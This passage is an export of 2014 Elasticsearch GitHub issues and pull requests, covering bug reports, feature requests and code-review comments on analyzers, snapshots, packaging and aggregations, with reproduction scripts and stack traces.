curl localhost:9200/_nodes/hot_threads &gt; hot_threads.txt
```

It is possible that it is related to https://github.com/elasticsearch/elasticsearch/issues/7990
</comment><comment author="clintongormley" created="2014-12-01T11:46:47Z" id="65053894">This issue should now have been fixed by the upgrade to Lucene 4.10 and #7306.  Closing.  Please reopen if this is still an issue
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Update scripting.asciidoc</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7384</link><project id="" key="" /><description>I was confused for a while why I couldn't access an object-valued field in a script using doc[...] until I found the explanation in the Script Fields documentation (http://www.elasticsearch.org/guide/en/elasticsearch/reference/current/search-request-script-fields.html). I basically just copied the explanation from that page and added it here.
</description><key id="40832173">7384</key><summary>Update scripting.asciidoc</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/clintongormley/following{/other_user}', u'events_url': u'https://api.github.com/users/clintongormley/events{/privacy}', u'organizations_url': u'https://api.github.com/users/clintongormley/orgs', u'url': u'https://api.github.com/users/clintongormley', u'gists_url': u'https://api.github.com/users/clintongormley/gists{/gist_id}', u'html_url': u'https://github.com/clintongormley', u'subscriptions_url': u'https://api.github.com/users/clintongormley/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/56599?v=4', u'repos_url': u'https://api.github.com/users/clintongormley/repos', u'received_events_url': u'https://api.github.com/users/clintongormley/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/clintongormley/starred{/owner}{/repo}', u'site_admin': False, u'login': u'clintongormley', u'type': u'User', u'id': 56599, u'followers_url': u'https://api.github.com/users/clintongormley/followers'}</assignee><reporter username="">juliar</reporter><labels><label>docs</label></labels><created>2014-08-21T18:12:52Z</created><updated>2014-09-07T09:40:00Z</updated><resolved>2014-09-07T09:40:00Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-08-22T14:54:49Z" id="53070343">Hi @juliar 

Thanks for the PR. Could I ask you to sign our CLA so that I can merge it in?
http://www.elasticsearch.org/contributor-agreement/
</comment><comment author="clintongormley" created="2014-09-07T09:37:56Z" id="54742059">CLA not signed, treating as bug report.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Request: expand JAVA_HOME search paths for Debian/Ubuntu</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7383</link><project id="" key="" /><description>Hello,

for Debian/Ubuntu there is a nice package "java-package" which automatically builds JDK/JRE packages for Oracle Java 6/7 and perhaps already version 8 in testing release... 

Therefore it would be nice to add in this line of elasticsearch/src/deb/init.d/elasticsearch:

```
# The first existing directory is used for JAVA_HOME (if JAVA_HOME is not defined in $DEFAULT)
JDK_DIRS="/usr/lib/jvm/java-7-oracle /usr/lib/jvm/java-7-openjdk /usr/lib/jvm/java-7-openjdk-amd64/ /usr/lib/jvm/java-7-openjdk-armhf /usr/lib/jvm/java-7-openjdk-i386/ /usr/lib/jvm/default-java"
```

also this path:

```
 /usr/lib/jvm/j2sdk1.7-oracle
```

BTW: 
Would be nice to get  also a check for existing java binary with correct version in the init script (and perhaps already as package dependencies ?) so that the init script do more then starting as "OK" without doing anything ;) ... 

Thanks

EDIT: sorry, dependencies are not good ... in Saltstack/puppet templates java ist often installed directly from tar files ... so better as Recommend packages if it should be setup in a .deb package.
</description><key id="40828592">7383</key><summary>Request: expand JAVA_HOME search paths for Debian/Ubuntu</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/spinscale/following{/other_user}', u'events_url': u'https://api.github.com/users/spinscale/events{/privacy}', u'organizations_url': u'https://api.github.com/users/spinscale/orgs', u'url': u'https://api.github.com/users/spinscale', u'gists_url': u'https://api.github.com/users/spinscale/gists{/gist_id}', u'html_url': u'https://github.com/spinscale', u'subscriptions_url': u'https://api.github.com/users/spinscale/subscriptions', u'avatar_url': u'https://avatars2.githubusercontent.com/u/667544?v=4', u'repos_url': u'https://api.github.com/users/spinscale/repos', u'received_events_url': u'https://api.github.com/users/spinscale/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/spinscale/starred{/owner}{/repo}', u'site_admin': False, u'login': u'spinscale', u'type': u'User', u'id': 667544, u'followers_url': u'https://api.github.com/users/spinscale/followers'}</assignee><reporter username="">Reiner030</reporter><labels><label>:Packaging</label></labels><created>2014-08-21T17:33:41Z</created><updated>2014-12-11T15:16:53Z</updated><resolved>2014-12-11T15:16:53Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="uschindler" created="2014-09-29T18:47:20Z" id="57208858">You can add the selected JVM to use by adding

```
JAVA_HOME=/path/to/jdk
```

to your /etc/default/elasticsearch config file. I prefer to do this and not relay on some preconfigured stuff.
</comment><comment author="Reiner030" created="2014-10-02T13:17:01Z" id="57627696">I wasn't the person who added these lines:

```
root@server # grep -A3 -B1 JDK /etc/init.d/elasticsearch 
# The first existing directory is used for JAVA_HOME (if JAVA_HOME is not defined in $DEFAULT)
JDK_DIRS="/usr/lib/jvm/java-7-oracle /usr/lib/jvm/java-7-openjdk /usr/lib/jvm/java-7-openjdk-amd64/ /usr/lib/jvm/java-7-openjdk-armhf /usr/lib/jvm/java-7-openjdk-i386/ /usr/lib/jvm/default-java"

# Look for the right JVM to use
for jdir in $JDK_DIRS; do
    if [ -r "$jdir/bin/java" -a -z "${JAVA_HOME}" ]; then
        JAVA_HOME="$jdir"
    fi
```

... but if such mechanism is offered then it would be nice to have it setup "right" ? ;)
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Default to all possible fields for items</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7382</link><project id="" key="" /><description>Items with no specified field now defaults to all the possible fields from the
document source. Previously, we had required 'fields' to be specified either
as a top level parameter or for each item. The default behavior is now similar
to the MLT API.
</description><key id="40828452">7382</key><summary>Default to all possible fields for items</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">alexksikes</reporter><labels><label>:More Like This</label><label>enhancement</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-21T17:32:27Z</created><updated>2015-06-07T12:12:10Z</updated><resolved>2014-08-22T13:10:38Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="jpountz" created="2014-08-21T19:37:14Z" id="52970942">What would happen eg. on a binary field or a geo shape?
</comment><comment author="alexksikes" created="2014-08-22T07:56:46Z" id="53033236">The field must be of type string so it will be [skipped](https://github.com/elasticsearch/elasticsearch/blob/5d987ad5e29cdd00bb710fad0a10e95c3611130e/src/main/java/org/elasticsearch/index/termvectors/ShardTermVectorService.java#L108).
</comment><comment author="jpountz" created="2014-08-22T08:05:01Z" id="53033855">This sounds good to me. Can you make it explicit in the documentation?
</comment><comment author="jpountz" created="2014-08-22T12:48:33Z" id="53056074">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>query_string can't find token that _analyze shows is generated, but term query can</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7381</link><project id="" key="" /><description>I have attached a short bash script to recreate the situation. I have a fairly simple custom analyzer that I want to break on camel case so lowercase is last. Using the _analyze endpoint I can see the token I am searching for is generated by the analyzer, however searching for it with query_string yields a different result that a term query. I put comments in the script to explain in more detail.

Thanks for any help!
# !/bin/sh

url="http://localhost:9200"
defaultIndex="example"

echo "Start over...this will fail the first time the script is run since the index will not exist"
curl -XDELETE "$url/$defaultIndex?refresh=true"

echo "Create index with custom analyzer"
curl -XPUT "$url/$defaultIndex" -d '{
 "index": {
            "analysis": {
                    "filter": {
                        "my_worddelim": {
                            "type": "word_delimiter",
                            "split_on_case_change": true,
                            "preserve_original": true
                        }
                    },
                    "analyzer": {
                            "my_analyzer": {
                                    "type":         "custom",
                                    "char_filter":  [ "html_strip" ],
                                    "tokenizer":    "keyword",
                                    "filter":       [ "stop", "my_worddelim", "lowercase" ]
                            }
                    }
            }
    }
}'

echo

curl -XPUT "$url/$defaultIndex/example/_mapping" -d '{
    "example" : {
        "properties" : {
            "name": {
                "type" : "multi_field",
                "path": "just_name",
                "fields" : {
                    "name": { "type": "string", "analyzer": "my_analyzer" },
            "sample" : {"type" : "string", "index" : "not_analyzed" },
                    "sample_name" : {"type" : "string", "analyzer": "my_analyzer" }
                }
            }
    }
    }
}'

echo "Shows the lowercase token exampleofbug is generated"
curl -XGET "$url/$defaultIndex/_analyze?analyzer=my_analyzer&amp;pretty=true" -d 'ExampleOf Bug'

echo "Post the document (haven't tried with non-bulk request)"
curl -XPOST "$url/$defaultIndex/example/_bulk?refresh=true" -d '
{ "index" :  {"_index":"example","_type":"example","_id":"2169167","_version_type":"internal","_timestamp":0} }
{"name":"ExampleOf Bug"}
'

echo

echo "query_string query is unable to find token in the name field even though the path is just_name"
echo "Escaping the space throws exception"
curl -XPOST "$url/$defaultIndex/example/_search?pretty=true" -d '
{
  "query": {
    "query_string": {
      "query": "name:\"exampleof bug\""
    }
  }
}
'

echo

echo "Can successfully find token in name field that I was unable to find with query_string"
curl -XPOST "$url/$defaultIndex/example/_search?pretty=true" -d '
{
  "query": {
    "term": {
      "name": "exampleof bug"
    }
  }
}
'
</description><key id="40821353">7381</key><summary>query_string can't find token that _analyze shows is generated, but term query can</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">billumina</reporter><labels /><created>2014-08-21T16:15:40Z</created><updated>2014-08-22T14:40:31Z</updated><resolved>2014-08-22T14:37:05Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-08-22T14:37:05Z" id="53068000">Hi @billumina 

I'm afraid that this is the fault of the word delimiter token filter in Lucene, which doesn't follow the contract for token filters and so produces broken token streams.  Token filters should not introduce new positions, but the WDF does.  So your phrase query actually becomes this:

```
name:\"(exampleof bug exampleof) bug\"
```

You can't combine WDF with phrase queries. 
</comment><comment author="billumina" created="2014-08-22T14:40:31Z" id="53068445">Thanks for explanation.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Is there any way to use multiple OR fields within a range facet?</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7380</link><project id="" key="" /><description>I have a database of records, and I'm trying to use facets to determine how many records belong to each date range (1700-1750, 1751-1800, etc). The trouble is, each record has a start date and an end date, and some records only have one filled out. For my range facet, if I only check if the start date is within the range, I miss a huge number of records that have an end date in that range. However, if I do a separate range facet for start_year and end_year, any record that has a start and end year within the same date range (e.g. 1701-1730) will be counted twice. Is there any way I can have two fields in my range query, or do it as an OR?

```
.Facets(facets =&gt; facets
.Terms(t =&gt; t.FacetName("DatabasesPerCategory").Field("category"))
.Terms(t =&gt; t.FacetName("DatabasesPerLocation").Field("locations.country"))
.Range(r =&gt; r.FacetName("startRange").Field("start_year").Ranges(ra =&gt; ra
    .FromTo(from: 0, to: 1700)
    .FromTo(from: 1700, to: 1749)
    .FromTo(from: 1750, to: 1799)
    .FromTo(from: 1800, to: 1849)
    .FromTo(from: 1850, to: 1899)
    .FromTo(from: 1900, to: 1949)
    .FromTo(from: 1950, to: DateTime.Now.Year)
    )
)
)
```
</description><key id="40820888">7380</key><summary>Is there any way to use multiple OR fields within a range facet?</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">estockwellalpert</reporter><labels /><created>2014-08-21T16:11:15Z</created><updated>2014-08-22T14:50:59Z</updated><resolved>2014-08-22T14:50:59Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-08-22T14:50:59Z" id="53069799">HI @estockwellalpert 

No you can't.  What you could do is to use a separate filtered aggregation for those docs with only a start date, and another one for those with only an end date.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Ignore segments.gen on metadata snapshots</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7379</link><project id="" key="" /><description>The `segments.gen` file is optional and might even change while we read it. It's safer to just ignore that file in the snapshot instead.

we saw test failing with:

```
Caused by: org.apache.lucene.index.CorruptIndexException: codec footer mismatch: actual footer=0 vs expected footer=-1071082520 (resource: MockIndexInputWrapper(NIOFSIndexInput(path="/Users/igor/Projects/elasticsearch/data/shared-hoverfly.local-CHILD_VM=[0]-CLUSTER_SEED=[-3070528509192838244]-HASH=[138C74D8B6080338]/nodes/1/indices/test-idx/5/index/segments.gen")))
    at org.apache.lucene.codecs.CodecUtil.validateFooter(CodecUtil.java:235)
    at org.apache.lucene.codecs.CodecUtil.retrieveChecksum(CodecUtil.java:228)
    at org.elasticsearch.index.store.Store$MetadataSnapshot.checksumFromLuceneFile(Store.java:564)
    at org.elasticsearch.index.store.Store$MetadataSnapshot.buildMetadata(Store.java:498)
    at org.elasticsearch.index.store.Store$MetadataSnapshot.&lt;init&gt;(Store.java:459)
    at org.elasticsearch.index.store.Store.getMetadata(Store.java:154)
    at org.elasticsearch.index.snapshots.blobstore.BlobStoreIndexShardRepository$SnapshotContext.snapshot(BlobStoreIndexShardRepository.java:428)
```

which can happen if commits happen concurrently since this file gets corrupted on purpose during a commit
</description><key id="40814284">7379</key><summary>Ignore segments.gen on metadata snapshots</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">s1monw</reporter><labels><label>:Store</label><label>bug</label><label>v1.3.3</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-21T15:10:13Z</created><updated>2015-06-07T19:03:56Z</updated><resolved>2014-08-21T15:52:05Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="rmuir" created="2014-08-21T15:13:51Z" id="52934333">My concern is that this is just a workaround, if metadata code isn't properly reading the latest commit, then this is just going to push the problem down to segments_N logic. 

How is this code looking for the latest commit? Maybe it should use SegmentInfos.read/FindSegmentsFile instead?
</comment><comment author="s1monw" created="2014-08-21T15:19:30Z" id="52935117">well the reason for this to fail here is that I already successfully read the `.si` file and then I try to read the checksum of the `segments.gen` file after I read the commit. but in that window it can change... so I think it's just a misunderstanding?
</comment><comment author="rmuir" created="2014-08-21T15:21:19Z" id="52935373">My bad, everything is good as of this morning. we read commit correctly, and read the correct one. So I agree, just ignore it.
</comment><comment author="imotov" created="2014-08-21T15:51:15Z" id="52940060">LGTM
</comment><comment author="s1monw" created="2014-08-21T15:52:05Z" id="52940188">pushed! 
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Move index templates api back to indices category and make put template and create index implement IndicesRequest</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7378</link><project id="" key="" /><description /><key id="40808462">7378</key><summary>Move index templates api back to indices category and make put template and create index implement IndicesRequest</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/javanna/following{/other_user}', u'events_url': u'https://api.github.com/users/javanna/events{/privacy}', u'organizations_url': u'https://api.github.com/users/javanna/orgs', u'url': u'https://api.github.com/users/javanna', u'gists_url': u'https://api.github.com/users/javanna/gists{/gist_id}', u'html_url': u'https://github.com/javanna', u'subscriptions_url': u'https://api.github.com/users/javanna/subscriptions', u'avatar_url': u'https://avatars1.githubusercontent.com/u/832460?v=4', u'repos_url': u'https://api.github.com/users/javanna/repos', u'received_events_url': u'https://api.github.com/users/javanna/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/javanna/starred{/owner}{/repo}', u'site_admin': False, u'login': u'javanna', u'type': u'User', u'id': 832460, u'followers_url': u'https://api.github.com/users/javanna/followers'}</assignee><reporter username="">javanna</reporter><labels><label>:Internal</label><label>enhancement</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-21T14:14:48Z</created><updated>2015-06-07T12:12:22Z</updated><resolved>2014-08-22T08:19:52Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-08-22T08:09:03Z" id="53034149">I left two comments regarding BWC but other than that I think it's ok to add for consistency?
</comment><comment author="s1monw" created="2014-08-22T08:17:26Z" id="53034806">ok fair enough LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Report conflict when merging `_all` field mapping and throw exception when doc_values specified</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7377</link><project id="" key="" /><description>- _all field was never merged when mapping was updated and no conflict reported
- _all accepted doc_values format although it is always tokenized. this setting was ignored before.

relates to #777

Note that the exception when `doc_values` was configured is new. This might cause problems for users that configured it and upgrade since the old mapping cannot be parsed anymore after this change.
</description><key id="40806760">7377</key><summary>Report conflict when merging `_all` field mapping and throw exception when doc_values specified</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/brwe/following{/other_user}', u'events_url': u'https://api.github.com/users/brwe/events{/privacy}', u'organizations_url': u'https://api.github.com/users/brwe/orgs', u'url': u'https://api.github.com/users/brwe', u'gists_url': u'https://api.github.com/users/brwe/gists{/gist_id}', u'html_url': u'https://github.com/brwe', u'subscriptions_url': u'https://api.github.com/users/brwe/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/4320215?v=4', u'repos_url': u'https://api.github.com/users/brwe/repos', u'received_events_url': u'https://api.github.com/users/brwe/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/brwe/starred{/owner}{/repo}', u'site_admin': False, u'login': u'brwe', u'type': u'User', u'id': 4320215, u'followers_url': u'https://api.github.com/users/brwe/followers'}</assignee><reporter username="">brwe</reporter><labels><label>:Mapping</label><label>enhancement</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-21T13:56:30Z</created><updated>2015-06-07T12:12:32Z</updated><resolved>2014-08-26T10:15:35Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="jpountz" created="2014-08-26T09:18:17Z" id="53394933">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Allow to get metadata from arbitrary commit points</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7376</link><project id="" key="" /><description>Today we always use the latest commit point to return the metadata from
the store. This might cause problems for snapshot and restore since in
contrast to recovery it won't prevent concurrent flushes (lucene commits).
This can lead to all kinds of interesting effects if we are snapshotting
while flushing. This change uses the IndexCommit to open the metadata snapshot
from the store which is consistent with what we snapshot.
</description><key id="40803290">7376</key><summary>Allow to get metadata from arbitrary commit points</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">s1monw</reporter><labels><label>:Snapshot/Restore</label><label>bug</label><label>resiliency</label><label>v1.3.3</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-21T13:20:04Z</created><updated>2015-06-07T19:04:06Z</updated><resolved>2014-08-21T14:11:34Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="imotov" created="2014-08-21T14:08:45Z" id="52924553">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Elasticsearch doesn't care about timezone and creates indexes with UTC</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7375</link><project id="" key="" /><description>This could benefit all people using ELK.

Our logs are rotated with daily fashion and this should match elasticsearch index. But when we do it now we got holes and duplicates :( Deleting index and just feeding logstash with data should be fine and dandy but there is mismatch timezone now.

There could be configuration option to set default timezone and the indexes would follow the log rotation.

All the best!
</description><key id="40800496">7375</key><summary>Elasticsearch doesn't care about timezone and creates indexes with UTC</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">3h4x</reporter><labels><label>discuss</label></labels><created>2014-08-21T12:45:58Z</created><updated>2016-06-21T09:52:40Z</updated><resolved>2014-08-25T10:00:24Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-08-22T13:51:28Z" id="53062474">Sorry @3h4x but I don't understand what you mean.  Could you explain in more detail please?
</comment><comment author="3h4x" created="2014-08-22T14:13:29Z" id="53065008">No worries.
When I delete index from elasticsearch I got hole in Kibana from 2:00 -&gt; 2:00 not midnight -&gt; midnight. We got different timezone than UTC.

Every midnight logrotate save new file on servers. When we want for whatever reason to delete elasticsearch index, recreate index and forward logs one more time then I need to grep like crazy because logrotated log isn't fitting the index.
</comment><comment author="clintongormley" created="2014-08-22T15:46:06Z" id="53077423">OK - more details still :)

Are you talking about index names? the `@timestamp` field? what?  Any reason why you don't convert your timestamps (or index names or whatever) to UTC in logstash? 
</comment><comment author="3h4x" created="2014-08-22T18:38:41Z" id="53103670">Okie dokie.
Everyday our elasticsearch creates index ( logstash-2014.08.22 ). I would like it to create daily index with regard to timezone so when I delete one index I will see empty one day in Kibana. Now because we are not in UTC i see empty day but from 2:00 to 2:00 next day.
I don't wanna manipulate `@timestamp` field. UTC is completely fine there.
I would like to see a configuration option in elasticsearch like "timezone offset index".  So index starts at midnight in our timezone and ends at midnight. 

Yes there is a reason why I don't manipulate `@timestamp`. It takes resources grok and mutate. I want to keep it simple. Just timezone offset in index creation would be lovely, is there any option like it or is it very unlikely to happen?
</comment><comment author="bleskes" created="2014-08-25T10:00:24Z" id="53247057">@3h4x To ES, the index name is arbitrary. It's logstash that decides how to name the indices and it does so in UTC. It seems the logstash team has already discussed this and has voted not to implement. Perhaps you can share your use case there and see whether it helps getting this implemented? https://logstash.jira.com/browse/LOGSTASH-973

Since this is not really an ES issue, I'll close it for now.
</comment><comment author="3h4x" created="2014-08-25T10:34:57Z" id="53249617">@bleskes thanks for your input. I'll try to lobby it there :v: 
</comment><comment author="nean-and-i" created="2016-06-21T09:52:40Z" id="227393652">But I guess it is something different if you need this functionality for dynamic filenames when using csv output module. 
I'd love to use dynamic filenames in the csv output module to get proper date values that matches with the records in the csv.
If there is an intention that logstash should or can be used for other purposes as for ES than it would be great to support features like that and outside the ES buble.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Make sure that multi_search request hands over its context and headers to its corresponding search requests</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7374</link><project id="" key="" /><description /><key id="40800179">7374</key><summary>Make sure that multi_search request hands over its context and headers to its corresponding search requests</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">javanna</reporter><labels><label>:Internal</label><label>enhancement</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-21T12:41:45Z</created><updated>2015-06-07T12:12:49Z</updated><resolved>2014-08-21T13:11:07Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="martijnvg" created="2014-08-21T13:05:16Z" id="52916438">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>NPE with geo_bounds agg</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7373</link><project id="" key="" /><description>I've received a report of an NPE which shows up when using a second geo_bounds agg. I've been unable to reproduce it, but the query looks like this:

```
{
  "size": 0,
  "sort": [
    {
      "@timestamp": {
        "order": "asc"
      }
    }
  ],
  "query": {
    "filtered": {
      "filter": {
        "range": {
          "@timestamp": {
            "from": "now-1h/h",
            "to": "now+1h/h"
          }
        }
      }
    }
  },
  "aggs": {
    "one_min_interval": {
      "date_histogram": {
        "field": "@timestamp",
        "interval": "1m"
      },
      "aggs": {
        "customer": {
          "terms": {
            "field": "soc_customer",
            "size": 10,
            "collect_mode": "breadth_first"
          },
          "aggs": {
            "destinationCountry": {
              "terms": {
                "field": "country_dst.raw",
                "size": 50,
                "collect_mode": "breadth_first"
              },
              "aggs": {
                "geo_dst_bounds": {
                  "geo_bounds": {
                    "field": "geo_dst"
                  }
                },
                "sourceCountry": {
                  "terms": {
                    "field": "country_src.raw",
                    "size": 200,
                    "collect_mode": "breadth_first"
                  },
                  "aggs": {
                    "geo_src_bounds": {
                      "geo_bounds": {
                        "field": "geo_src"
                      }
                    },
                    "threatCategory": {
                      "terms": {
                        "field": "threat_category",
                        "size": 100
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}
```

And the stacktrace as follows:

```
[org.elasticsearch.action.search.SearchRequest@174ed99a] lastShard [true]
java.lang.ArrayIndexOutOfBoundsException: 8
    at org.elasticsearch.common.util.BigArrays$DoubleArrayWrapper.get(BigArrays.java:264)
    at org.elasticsearch.search.aggregations.metrics.geobounds.GeoBoundsAggregator.collect(GeoBoundsAggregator.java:135)
    at org.elasticsearch.search.aggregations.BucketCollector$2.collect(BucketCollector.java:81)
    at org.elasticsearch.search.aggregations.bucket.DeferringBucketCollector$1.collect(DeferringBucketCollector.java:94)
    at org.elasticsearch.search.aggregations.FilteringBucketCollector.collect(FilteringBucketCollector.java:63)
    at org.elasticsearch.search.aggregations.RecordingPerReaderBucketCollector$PerSegmentCollects.replay(RecordingPerReaderBucketCollector.java:108)
    at org.elasticsearch.search.aggregations.RecordingPerReaderBucketCollector.replayCollection(RecordingPerReaderBucketCollector.java:153)
    at org.elasticsearch.search.aggregations.bucket.DeferringBucketCollector.prepareSelectedBuckets(DeferringBucketCollector.java:110)
    at org.elasticsearch.search.aggregations.Aggregator.runDeferredCollections(Aggregator.java:263)
    at org.elasticsearch.search.aggregations.bucket.terms.GlobalOrdinalsStringTermsAggregator.buildAggregation(GlobalOrdinalsStringTermsAggregator.java:158)
    at org.elasticsearch.search.aggregations.Aggregator.gatherAnalysis(Aggregator.java:362)
    at org.elasticsearch.search.aggregations.AggregatorFactories$1.gatherAnalysis(AggregatorFactories.java:143)
    at org.elasticsearch.search.aggregations.BucketCollector$2.gatherAnalysis(BucketCollector.java:102)
    at org.elasticsearch.search.aggregations.bucket.DeferringBucketCollector$1.gatherAnalysis(DeferringBucketCollector.java:104)
    at org.elasticsearch.search.aggregations.FilteringBucketCollector.gatherAnalysis(FilteringBucketCollector.java:81)
    at org.elasticsearch.search.aggregations.bucket.DeferringBucketCollector.gatherAnalysis(DeferringBucketCollector.java:125)
    at org.elasticsearch.search.aggregations.bucket.BucketsAggregator.bucketAggregations(BucketsAggregator.java:122)
    at org.elasticsearch.search.aggregations.bucket.terms.GlobalOrdinalsStringTermsAggregator.buildAggregation(GlobalOrdinalsStringTermsAggregator.java:162)
    at org.elasticsearch.search.aggregations.Aggregator.gatherAnalysis(Aggregator.java:362)
    at org.elasticsearch.search.aggregations.AggregatorFactories$1.gatherAnalysis(AggregatorFactories.java:143)
    at org.elasticsearch.search.aggregations.bucket.DeferringBucketCollector$1.gatherAnalysis(DeferringBucketCollector.java:104)
    at org.elasticsearch.search.aggregations.FilteringBucketCollector.gatherAnalysis(FilteringBucketCollector.java:81)
    at org.elasticsearch.search.aggregations.bucket.DeferringBucketCollector.gatherAnalysis(DeferringBucketCollector.java:125)
    at org.elasticsearch.search.aggregations.bucket.BucketsAggregator.bucketAggregations(BucketsAggregator.java:122)
    at org.elasticsearch.search.aggregations.bucket.terms.GlobalOrdinalsStringTermsAggregator.buildAggregation(GlobalOrdinalsStringTermsAggregator.java:162)
    at org.elasticsearch.search.aggregations.Aggregator.gatherAnalysis(Aggregator.java:362)
    at org.elasticsearch.search.aggregations.AggregatorFactories$1.gatherAnalysis(AggregatorFactories.java:143)
    at org.elasticsearch.search.aggregations.bucket.BucketsAggregator.bucketAggregations(BucketsAggregator.java:122)
    at org.elasticsearch.search.aggregations.bucket.histogram.HistogramAggregator.buildAggregation(HistogramAggregator.java:116)
    at org.elasticsearch.search.aggregations.AggregationPhase.execute(AggregationPhase.java:133)
    at org.elasticsearch.search.query.QueryPhase.execute(QueryPhase.java:171)
    at org.elasticsearch.search.SearchService.executeQueryPhase(SearchService.java:261)
    at org.elasticsearch.search.action.SearchServiceTransportAction$5.call(SearchServiceTransportAction.java:206)
    at org.elasticsearch.search.action.SearchServiceTransportAction$5.call(SearchServiceTransportAction.java:203)
    at org.elasticsearch.search.action.SearchServiceTransportAction$23.run(SearchServiceTransportAction.java:517)
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
    at java.lang.Thread.run(Thread.java:745)
```
